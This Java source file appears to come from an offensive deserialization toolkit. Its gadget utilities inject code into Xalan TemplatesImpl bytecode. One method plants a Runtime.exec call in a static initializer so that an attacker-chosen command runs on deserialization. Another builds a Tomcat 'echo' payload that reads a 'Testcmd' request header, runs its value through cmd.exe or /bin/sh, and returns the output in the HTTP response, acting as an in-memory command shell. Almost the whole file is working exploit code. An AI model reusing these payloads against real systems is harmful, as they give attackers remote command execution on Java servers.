package com.summersec.attack.deser.util;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import javassist.ClassClassPath;
import javassist.ClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;





public class GadgetsK {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");


        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }



    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy(Map<String, Object> map, Class<T> iface, Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler(Map<String, Object> map) throws Exception {
        return (InvocationHandler)Reflections.getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(new Object[] { Override.class, map });
    }


    public static <T> T createProxy(InvocationHandler ih, Class<T> iface, Class<?>... ifaces) {
        Class<?>[] allIfaces = (Class[])Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap(String key, Object val) {
        Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl(String command) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(command,

                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((ClassPath)new ClassClassPath(abstTranslet));
        CtClass clazz = pool.makeClass("dogeser.doge" + System.nanoTime());

        String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"") + "\");";

        clazz.makeClassInitializer().insertAfter(cmd);
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        byte[] classBytes = clazz.toBytecode();


        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes });

        Reflections.setFieldValue(templates, "_name", "Doge");
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static Object createTemplatesTomcatEcho() throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImplEcho(
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImplEcho(TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImplEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        T templates = tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath((ClassPath)new ClassClassPath(abstTranslet));

        CtClass clazz = pool.makeClass("dogeser.doge" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addMethod(CtMethod.make("private static void writeBody(Object resp, byte[] bs) throws Exception {\n    Object o;\n    Class clazz;\n    try {\n        clazz = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n        o = clazz.newInstance();\n        clazz.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});\n        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n    } catch (ClassNotFoundException e) {\n        clazz = Class.forName(\"java.nio.ByteBuffer\");\n        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n    } catch (NoSuchMethodException e) {\n        clazz = Class.forName(\"java.nio.ByteBuffer\");\n        o = clazz.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});\n        resp.getClass().getMethod(\"doWrite\", new Class[]{clazz}).invoke(resp, new Object[]{o});\n    }\n}", clazz));

        clazz.addMethod(CtMethod.make("private static Object getFV(Object o, String s) throws Exception {\n    java.lang.reflect.Field f = null;\n    Class clazz = o.getClass();\n    while (clazz != Object.class) {\n        try {\n            f = clazz.getDeclaredField(s);\n            break;\n        } catch (NoSuchFieldException e) {\n            clazz = clazz.getSuperclass();\n        }\n    }\n    if (f == null) {\n        throw new NoSuchFieldException(s);\n    }\n    f.setAccessible(true);\n    return f.get(o);\n}\n", clazz));


        clazz.addConstructor(CtNewConstructor.make("public TomcatEcho() throws Exception {\n    Object o;\n    Object resp;\n    String s;\n    boolean done = false;\n    Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), \"threads\");\n    for (int i = 0; i < ts.length; i++) {\n        Thread t = ts[i];\n        if (t == null) {\n            continue;\n        }\n        s = t.getName();\n        if (!s.contains(\"exec\") && s.contains(\"http\")) {\n            o = getFV(t, \"target\");\n            if (!(o instanceof Runnable)) {\n                continue;\n            }\n\n            try {\n                o = getFV(getFV(getFV(o, \"this$0\"), \"handler\"), \"global\");\n            } catch (Exception e) {\n                continue;\n            }\n\n            java.util.List ps = (java.util.List) getFV(o, \"processors\");\n            for (int j = 0; j < ps.size(); j++) {\n                Object p = ps.get(j);\n                o = getFV(p, \"req\");\n                resp = o.getClass().getMethod(\"getResponse\", new Class[0]).invoke(o, new Object[0]);\n                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"Testecho\"});\n                if (s != null && !s.isEmpty()) {\n                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n                    resp.getClass().getMethod(\"addHeader\", new Class[]{String.class, String.class}).invoke(resp, new Object[]{\"Testecho\", s});\n                    done = true;\n                }\n                s = (String) o.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(o, new Object[]{\"Testcmd\"});\n                if (s != null && !s.isEmpty()) {\n                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", s} : new String[]{\"/bin/sh\", \"-c\", s};\n                    writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes());\n                    done = true;\n                }\n                if ((s == null || s.isEmpty()) && done) {\n                    writeBody(resp, System.getProperties().toString().getBytes());\n                }\n\n                if (done) {\n                    break;\n                }\n            }\n            if (done) {\n                break;\n            }\n        }\n    }\n}", clazz));




        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        byte[] classBytes = clazz.toBytecode();


        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] { classBytes });





        Reflections.setFieldValue(templates, "_name", "Doge");
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Class<?> nodeC;
        HashMap<Object, Object> s = new HashMap<>();
        Reflections.setFieldValue(s, "size", Integer.valueOf(2));

        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(new Class[] { int.class, Object.class, Object.class, nodeC });
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(new Object[] { Integer.valueOf(0), v1, v1, null }));
        Array.set(tbl, 1, nodeCons.newInstance(new Object[] { Integer.valueOf(0), v2, v2, null }));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}

